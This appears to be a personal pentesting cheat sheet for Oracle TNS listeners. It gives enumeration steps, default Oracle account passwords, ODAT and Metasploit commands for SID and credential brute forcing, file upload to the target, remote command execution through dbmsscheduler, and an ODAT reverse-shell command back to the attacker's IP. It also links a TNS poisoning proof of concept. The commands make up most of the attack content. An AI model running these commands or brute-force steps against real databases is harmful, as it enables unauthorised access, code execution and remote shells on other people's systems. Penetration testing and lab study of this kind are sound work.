# Oracle-TNS

[GitHub SnowWight hackdocs](https://github.com/TheSnowWight/hackdocs/blob/master/pentesting/1521-1522-1529-pentesting-oracle-listener/README.md) - this hackdocs is awesome and better than HackTricks

Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation (from [here](https://www.techopedia.com/definition/8711/oracle-database)).
1521
1522 - Default
1523-9 potential secondary listeners

1. **Enumerate version** info \(search for **known vulns**\)
	 - `nmap -sV
	 - `msf> use auxiliary/scanner/oracle/tnslsnr_version`
	 - `tnscmd10g version -p 1521 -h $IP`
2. **Bruteforce TNS listener** communication \(not always needed\)
3. **Enumerate**/Bruteforce **SID names** \(like database names\)
	- Important as interaction requires SID ie: `XE`
		- `msf> use auxiliary/scanner/oracle/sid_enum`
		- `odat.py all`
4. **Bruteforce credentials** for valid SID name discovered
5. Try to **execute code**

Other useful TNS listener commands:

| **Command**  | **Purpose**                                                     |
| :----------- | :-------------------------------------------------------------- |
| ping         | Ping the listener                                               |
| version      | Provide output of the listener version and platform information |
| status       | Return the current status and variables used by the listener    |
| services     | Dump service data                                               |
| debug        | Dump debugging information to the listener log                  |
| reload       | Reload the listener configuration file                          |
| save\_config | Write the listener configuration file to a backup location      |
| stop         | Invoke listener shutdown                                        |

Default passwords associated with Oracle:
* **DBSNMP/DBSNMP** — Intelligent Agent uses this to talk to the db server \(its some work to change it\)
* **SYS/CHANGE\_ON\_INSTALL** — Default sysdba account before and including Oracle v9, as of version 10g this has to be different!
* **PCMS\_SYS/PCMS\_SYS** — Default x account
* **WMSYS/WMSYS** — Default x account
* **OUTLN/OUTLN** — Default x account
* **SCOTT/TIGER** — Default x account

You need [[ODAT]]:
[medium article by Mario Rufisanto on Oracle TNS Pentesting 2024](https://medium.com/fmisec/oracle-tns-penetration-test-using-odat-83fafcea1988) - 2024. Updated - removed `<>`
```bash
#!/bin/bash  
  
sudo apt-get install libaio1 python3-dev alien python3-pip -y  
git clone https://github.com/quentinhardy/odat.git  
cd odat/  
git submodule init  
git submodule update  
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y  
pip3 install cx_Oracle  
sudo apt-get install python3-scapy -y  
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap  
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

`sqlplus` [[SQLPlus]]
```bash
# if error:
# `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig


sqlplus $username/$password@$IP:$port/$SID;
# Always check if account has sysdma access (system database priviledges)
sqlplus $username/$password@$IP:$port/$SID as sysdma;
# as sysop # system operator
```


Useful commands - some commands **DO NOT AND WILL NOT EVER WORK**
 ```bash

# ./odat.py java !! does not work !!  
 
# Remember Odat is like impacket there are lots of tools
# Takes awhile and there are prompts
./odat.py all -s $ip

# service name guessing is required
./odat.py snguesser -s $ip
# SID Guess is required
./odat.py snguesser -s $ip

# this tool asks alot try a different tool for this
./odat.py passwordguesser -s $ip

# With valid credentials and permission you can upload a shell and execute it 
# Weirdly it has whitespace for the path then the file
./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password --getFile remotePath remoteFile localFile

./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password  --putFile remotePath remoteFile localFile

./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password ----removeFile remotePath remoteFile 

# This seems weird from an OPSEC, but this tool is from a different era
./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password --test-module 

# Never managed to make work but SnowWight has it
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"

# Will prompt for a http server to serve reverse shell window and linux compatible
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --reverse-shell $localIP $port
```

[[Metasploit]]
```ruby 
# Some old version of MSF can just ask for SID
#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf6 
# Brute force the SID
msf>use auxiliary/admin/oracle/sid_brute
# Brute force user accounts
msf>scanner/oracle/oracle_login

```

## Vulnerabilities

11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3 are vulnerable to offline brute force

Vulnerability tested on oracle 10.1.0.3.0 – should work on thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical Patch update October 2007.

```ruby
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
####  TNS Listener Poisoning

Odat can perform this, [GitHub bongbongco/CVE-2012-1675 PoC](https://github.com/bongbongco/CVE-2012-1675/blob/master/oracle-tns-poison.nse)


## References

[GitHub SnowWight hackdocs](https://github.com/TheSnowWight/hackdocs/blob/master/pentesting/1521-1522-1529-pentesting-oracle-listener/README.md)
[GitHub bongbongco/CVE-2012-1675 PoC](https://github.com/bongbongco/CVE-2012-1675/blob/master/oracle-tns-poison.nse)
[Medium article by Mario Rufisanto on Oracle TNS Pentesting 2024](https://medium.com/fmisec/oracle-tns-penetration-test-using-odat-83fafcea1988) 